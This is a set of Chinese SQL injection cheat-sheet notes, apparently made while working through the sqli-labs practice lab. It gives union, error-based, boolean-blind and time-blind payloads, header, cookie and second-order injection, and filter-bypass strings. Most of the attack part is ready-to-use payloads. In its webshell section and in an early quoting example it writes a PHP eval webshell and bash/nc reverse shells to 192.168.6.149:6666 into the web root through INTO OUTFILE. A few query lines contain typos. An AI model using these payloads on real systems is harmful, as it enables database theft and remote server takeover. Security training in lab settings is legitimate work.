## 注意事项

```sql
-- 引号问题
-- 1、单引号的解析问题
SELECT * FROM users WHERE id='1' and 1=2 '' LIMIT 0,1 -- 错误
/*这两个连续的''在此是不合法的，它无法被解析，正确的命令应该是再加一个and，他就可以被解析*/
SELECT * FROM users WHERE id='1' and 1=2 and '' LIMIT 0,1 --正确


-- 2、sql中字符串必须用''框起来


-- 3、单双引号的闭合问题
-- 错误写法，这里exec中的第一个单引号就把<?php前的单引号给闭合了。
-- 而且exec的第一个单引号会把-c后边（bash前边）的单引号闭合。
select * from users where id=1 union select 1,'<?php exec('/bin/bash -c 'bash -i >& /dev/tcp/192.168.6.149/6666 0>&1'') ?>',3 into outfile '/var/www/html/1.php';

-- 正确写法
select * from users where id=1 union select 1,'<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/192.168.6.149/6666 0>&1\'") ?>',3 into outfile '/var/www/html/1.php';


-- 4、group_concat和concat
-- group_concat是查询的某一个row的结合，将会把id的结果集作为一个结果返回
select group_concat(id) from security.users; 

-- concat是将其()内的参数组合在一起显示


-- 5、逻辑关键字WHERE和and与or
-- where将返回使得条件为真的结果，而非返回简单的真和假
-- and运算符的优先级高于or
-- 空或者空格''不代表1和0，它也是一个条件

-- 对于and，它要求查询到的内容必须满足id=1和id=2这两个条件，显然没有任何一个数据能满足，因此返回空
where id=1 and id=2;
-- 对于or，它要求查询到的内容要么满足id=1，要么满足id=2，那显然有两个数据可以满足，因此返回两个结果
where id=1 or id=2;

-- 对于and，它要求查询到的内容必须满足id=1和1这两个条件，显然1永远被满足，因为只有id=1同时满足两个条件，返回id=1的结果
where id=1 and 1;
-- 对于or，它要求查询到的内容要么满足id=1，要么满足1，显然1永远被满足，因为只满足一个条件即可，因此返回所有结果
where id=1 or 1;
```

```sql
/*--作为注释符时，后边需要加任意空格和一个任意字符才可以作注释，而浏览器往往在传参的时候会忽略这个空格，因此--作为注释符被sql解析*/
-- 这是正确的
http://192.168.6.171:81/Less-1/?id=1' and 1=2 -- q
http://192.168.6.171:81/Less-1/?id=1' and 1=2 --+
-- 这是错误的
http://192.168.6.171:81/Less-1/?id=1' and 1=2 --q
http://192.168.6.171:81/Less-1/?id=1' and 1=2 --_(_代表一个空格)
```

```sql
-- 联合查询问题
-- 1、联合查询返回的结果和原始结果的关系，以及如何和原始结构合并
SELECT * FROM users WHERE id=1 union select 1,2,3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
|  1 | 2        | 3        |
+----+----------+----------+
-- 联合查询在sql中的结果是返回原始查询和联合查询共同的结果集。

/*但是在浏览器中回显的时候一般要看后端脚本怎么将结果回显到浏览器上，一般都只会通过$row = mysql_fetch_array($result)函数返回结果集的第一个结果，即DUMB和DUMB，而不是DUMB2和DUMB3。*/

SELECT * FROM users WHERE id=1 union select 1,2,3 LIMIT 1,1;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | 2        | 3        |
+----+----------+----------+
-- 但是可以通过LIMIT a,b来限制结果集结果，其中a代表偏移量，b代表显示几行，最后将显示原先结果集中第a行以后的共b行结果。
-- 或者用group_concat()函数来使得结果集合并为一行，但是这样可能会因为浏览器的显示字符有限而使得显示不全
SELECT * FROM users WHERE id='' union select 1,group_concat(id),3 from users;
+----+-------------------------------+----------+
| id | username                      | password |
+----+-------------------------------+----------+
|  1 | 1,2,3,4,5,6,7,8,9,10,11,12,14 | 3        |
+----+-------------------------------+----------+
SELECT * FROM users WHERE id='' and updatexml(1, concat(0x7e, ((select group_concat(table_name) from information_schema.tables where table_schema='security')), 0x7e), 3);

-- 2、联合查询和and的区别
-- uniont select前后是两个逻辑，他们之间没有与或非的关系
SELECT * FROM users WHERE id=1 and 1=2 union select 1,2,3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | 2        | 3        |
+----+----------+----------+
-- 这里id=1虽然存在但是由于和1=2进行了and，所以没有id=1的结果
SELECT * FROM users WHERE id=1 union select 1,2,3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
|  1 | 2        | 3        |
+----+----------+----------+
-- 这里没有用and因为有id=1的结果
```

```sql
-- 特殊问题
-- sql某些函数的参数不可以是子查询，但是可以通过括号先执行一个子查询，再将结果作为参数输入。虽然某些函数参数可以为子查询，但是最好的习惯就是全部将子查询的结果作为参数。
-- 错误示范(以length()函数举例)
select * from users where id='1' and length(select database()) = name-length;
-- 正确写法
select * from users where id='1' and length((select database()) = name-length;
```

## 基本语句

```sql
#显示所有数据库
show databases;
#显示当前数据库所有表
show tables;
#选择数据库
use xxx_
#显示表结构
describe xxx_table;
#创建数据库
create database xxx_base;
#创建表,格式为（列名 数据类型 主键 不允许为空 自动增加序号），其中列名和数据类型为必须，其余顺序可变或为空 
create table xxx_table (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(100) NOT NULL,
    age INT NOT NULL,
    email VARCHAR(100)
);
#插入数据(空部分代表为int类型，反正不是字符型)
insert into xxx_table (row_1, row_2, row_3) values('', , '')
#查询数据(其中字符型数据需要加'或")
select row_1，row_2 from xxx_table where row_1 = '';
#查看表内所有数
select * from table_name;
#更新数据
update xxx_table set row_1 = '' where row_2 = '';
#删除数据
delete from xxx_table where row_1 = '';
#删除表
drop table xxx_table;
#删除数据库
drop database xxx_base;
```



## 手注思路

```sql
-- 1、判断在哪检测注入
-- URL注入
GET请求传递参数时
-- POST注入
POST请求传递参数时，包括JSON/XML
-- header注入（报错注入偏多，少有回显）
-- 服务器可能会将请求头中的信息用于数据库查询或日志记录（日志插到数据库日志表）
-- 如果服务端只记录成功执行某操作的数据和日志的话，在注入时要以能成功执行该操作为前提
User-Agent: 客户端使用的操作系统、浏览器版本
Cookie: 辨别用户身份，免登录，一般是加密的，存储在用户本地
Host: 客户端自己指定想访问的域名、ip、端口号
X-Forwarded-For: 代表客户端真实IP，可以伪造（服务端可以用REMOTE_ADDR获取真实不可伪造的IP）
Clinet-IP: 同上
Referer: 浏览器向服务端表明自己是从哪个页面链接过来的
-- 文件上传注入
存在文件上传和文件查询的情况，服务端可能会用sql查询该文件名，因此在文件名中尝试注入
-- URL路径注入（少见）
服务端使用URL路径的一部分作为参数处理
-- 二次注入
存在将数据存储到数据库的情况（例如注册），当操作（增删改查）该数据时触发，不会有实时回显，需要通过其它的进一步操作，使得利用它在数据库中进行恶意的操作（增删改查）以达成目的




-- 2、判断是否有注入
-- 挨着尝试 无闭合，''闭合，""闭合，('')闭合，("")闭合，((''))闭合，((""))闭合；然后加上and 1=1和and 1=2看是否存在注入，如果第一个逻辑真返回为原始查询，第二个逻辑假返回另一个结果(不一定是报错，但是肯定和原始查询结果不一样）则证明存在该闭合注入，否则不好说（可能被过滤了and逻辑或者没有注入点或者存在时间盲注点）。
-- 这里用and的前提是and前的逻辑（原始输入）是正确的
-- 如果原始输入是猜不到的或者不正确的，那么就使用OR尝试，OR 1=1即可

-- OR:
-- 对于原始输入无法猜到的情况，就要用OR
-- OR一般尽量用在最后一个传入数据库的参数处，包括后续的注入逻辑也尽量用在最后一个传入数据库的参数处


-- --+不能用的时候试试-- qwe，可能会过滤掉+号

-- ps:显式回显指无论何种命令要么无论真假只返回固定一个内容（半隐），要么返回的内容和命令真假有关（假隐），要么返回的内容和命令执行结果无关（连命令真假都无关）（真隐）。

-- 3、选择注入方式
-- 基本注入（只能拿到部分数据）
-- 
-- 联合注入（有显式回显的情况）
-- 报错注入（无显式回显的情况（半隐，假隐，真隐都可以尝试），前提是服务端没有正确处理sql报错，此注入方法比盲注简单，优先级大于盲注；另一种情况是即使有显式回显，但是显式回显只返回了无关紧要的内容（这也算没有显式回显），并没有返回命令执行的结果）
-- 布尔盲注（无显式回显的情况，但逻辑真和逻辑假有不同的回显（假隐））
-- 时间盲注（不仅无显式回显（三隐都可以尝试），连逻辑真和逻辑假都是相同的回显，即布尔盲注不可用）

-- 4、联合注入
-- 判断列数（row,也即字段数）
-- 判断列数是为了后边联合查询结果和原始查询结果列保持一致，否则会报错
-- 从1开始尝试，到报错为止即为列数（不报错证明存在第n列）
select * from users where id=1 order by 1;

-- 联合查询查看所有库
select * from users where id=1 union select 1,schema_name,3 from information_schema.schemata;
-- 联合查询查看当前库（联合查询担当了select关键字的任务，否则单纯的一个databaes()是不会返回当前库名的
select * from users where id=1 union select 1,database(),3;

-- 联合查询查看当前库中的所有表
select * from users where id=1 union select 1,table_name,3 from information_schema.tables where table_schema="某库名（或者为当前库名database()）";

-- 联合查询查看当前表中所有的列(注意同时过滤表名和库名，否则可能会有同名列)
select * from users where id=1 union select 1,column_name,3 from information_schema.columns where table_schema="schema-name" and table_name="table-name";

-- 其实拿到表名后就可以配合LIMIT查看该表所有数据了
-- 或者拿到列名后之查看部分数据
select * from users where id=1 union select 1,row1-name,row2-name from table-name;


--将数据写入文件
select 1,2,3 into outfile "/path/to/write"; 

-- 5、报错注入
-- 爆当前库名
select * from users where id='1' and updatexml(1, concat(0x7e, (select database()), 0x7e), 3);
select * from users where id='1' and updatexml(1, concat('!', (select database()), '!'), 3);
-- 接下来替换select database()进行类似联合注入的手注即可
-- 注意的是报错一般有浏览器回显的长度限制

-- 6、布尔盲注
-- 判长度
select * from users where id='1' and length((slect databse())) = 8;
-- 判字符(不能一口气判好几列，不能用select * from, 除非只有一列)
select * from users where id='1' and ascii(substr((select row1 from table-name where row2=? limit 0,1), a, b)) = 97;

-- 7、时间盲注
-- 这里and后边if语句的逻辑结果是sleep()或者1，其中sleep()的为0
-- 也就是说如果
select * from users where id='1' and if((select database())='security', sleep(5), 1);
```





## 无显式回显说明

```sql
-- 什么是无显式回显
select * from users where id=1；
-- 返回的sql查询结果是
|  1 | Dumb     | Dumb     |
-- 但是这三个任何一个列的结果都不会显示在浏览器上（即可能后端拿着这个数据干了别的事，只返回了成功或失败），这就是无显式的回显。
```





## 报错注入详解

报错注入：无显式回显的不代表有报错注入，输入了错误的内容（比如and 1=2）导致了报错也不代表会有报错注入，得用updatexml()尝试才知道有没有报错注入。

```sql
-- 原始查询
select * from users where id='1'；
-- 使用updatexml报错查询，它和联合查询不同，不需要关心字段数等，一般搭配AND和OR使用
-- ###特别注意的是，mysql机制中，如果and前的条件不成立，则压根不会执行and后边的条件；同样的，如果OR前面的成立了，则也压根不会执行OR后边的条件。
-- ###还有一点要注意，concat中间是要加括号的，而且要加完整的命令
select * from users where id='1' and updatexml(1, concat(0x7e, (select database()), 0x7e), 3);
select * from users where id='1' and updatexml(1, concat('~', (select database()), '~'), 3);
-- 但是报错一般有长度限制
```

## 布尔盲注详解

**布尔盲注的核心是要构造正确的逻辑and和or，使得返回结果以布尔表达式的真假为唯一变量**

**之所以用and是因为id=1一定对，唯一变量就成了布尔表达式**

**用or是因为id='none'一定是错误的，唯一变量就成了布尔表达式**

```sql
-- 猜名字长度length()
select * from users where id='none' or length(database()) = name-length;
-- length的参数只能是字符串或数值，不能是子查询,但是可以用括号先得到子查询的结果在给length()
select * from users where id='none' or length((select database())) = name-length;

-- 猜名字之取子串substr() 
-- 取database()的从a开始长度为b的子串（从1开始）
select * from users where id='1' and substr((select database(), a, b)) = "sub-str";
-- 取ascii()
select * from users where id='1' and ascii("a") = 97;
-- 合起来就是
select * from users where id='1' and ascii(substr((select database(), a, b)) = 97

-- 对于个返回row的情况，可以使用limit限制输出来挨个获得结果

-- 这里比较特殊的是取表名长(需要用limit限制输出)
select * from users where id='1' and length((select table_name from information_schema.tables where table_schema="security" limit 0, 1)) = 8;
```

## 时间盲注详解

```sql
-- 在尝试1=1后如果延迟返回则存在时间注入
select * from users where id=1 and if(1=1, sleep(5), 1);
-- 类似布尔盲注，爆库名长
select * from users where id=1 and if(length((select database()))=8, sleep(5), 1);
```



## 写马

前提是要知道网站的路径，可以选择

```sql
-- 1、into outfile
-- webshell
select * from users where id=1 union select 1,'<?php eval($_REQUEST[cmd]) ?>',3 into outfile '/var/www/html/php_name.php';
-- 反弹shell
select * from users where id=1 union select 1,'<?php exec(\'bash -c "bash -i >& /dev/tcp/192.168.6.149/6666 0>&1" \') ?>',3 into outfile '/var/www/html/php_name.php';
select * from users where id=1 union select 1,'<?php exec("nc 192.168.6.149 6666") ?>',3 into outfile '/var/www/html/php_name.php';
```

## 数据库插入命令注入详解

```sql
-- 1、对于插入数据库命令，values的参数可以是逻辑，比如and 1=1，因此可以采用盲注和报错注入
insert into (datbase-name.)table-name (row1, row2, row3) values (value1, value2, value3);
===>
-- 要注意闭合问题，一般values的参数不是整型就是字符型，因此就是无闭合和有''和""，几乎没别的情况
insert into (datbase-name.)table-name (row1, row2, row3) values ('' and updatexml(1,concat(~,(select database()),~),3), value2, value3);

```

## cookie注入详解

```sql
-- cookie的设置可能存在重定向的情况。
-- 浏览器在收到一个设置cookie的重定向报文后，不会解析和返回查看重定向报文的载荷，而是直接对重定向目的进行请求。因此浏览器不会渲染回复的重定向报文，而是直接渲染对重定向目的的回复报文。

-- 很多情况下cookie会被编码， 比如base64，需要对整个cookie和注入命令重新编码输入（改变一个属整个编码值都改变，类似hash）
```

## 二次注入详解

```sql
-- 第一种
-- 注册时用户名以name'#或者name'-- q注册
-- 在修改密码时，没有对修改密码使用的http传入参数作过滤，从而导致对name'#用户修改密码变成了对name用户修改密码
update table-name set row1='$_value1' where username='$username' and row3='$_value3'
```



# 过滤方式及对应绕过方式

## 1、过滤注释符--

过滤注释符时，绕过的核心思想是利用逻辑or '、or "、and '、and "等闭合之前的引号

```sql
-- 1、隐式查询+条件逻辑闭合方式
select * from users where id='$_inject';
-- 报错注入
$_inject:' and updatexml(1,concat(0x7e,(select database()),0x7e),3) or/and '1'='1
===>
select * from users where id='' and updatexml(1,concat(0x7e,(select database()),0x7e),3) or/and '1'='1';
-- 布尔盲注
$_inject:' or length((select database()))=8 or '1'='2
===>
select * from users where id='' or length((select database()))=8 or '1'='2';




-- 2、联合查询+条件逻辑闭合方式
select * from users where id='$_inject';

-- 通过调整null数替代order by爆查询列数
$_inject:' union select null,null,null from information_schema.schemata where schema_name=1 or/and '1'='1
===>select * from users where id='' union select null,null,null from information_schema.schemata where schema_name=1 or/and '1'='1';

-- 爆当前库名
$_inject:' union select 1,(select database()),3 from information_schema.schemata where schema_name=1 or/and '1'='1
===>select * from users where id='' union select 1,(select database()),3 from information_schema.schemata where schema_name=1 or/and '1'='1';

--爆表名(没法用limit，但可以用group_concat()和table_name!=''慢慢爆表名；或者再嵌套一层union select去闭合引号可以用limit)
$_inject:' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' or '1'='2
$_inject:' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' and '1'='1
===>select * from users where id='' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' or '1'='2';

-- 利用逻辑非!=进一步爆所有表名
$_inject:' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' and table_name!='emails' or '1'='2
===>select * from users where id='' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' and table_name!='emails' or '1'='2';
```

'and updatexml(1,concat(0x7e,(select database()),0x7e),3) or '1'='1

update xxx_table set row_1 = '' where row_2 = '';

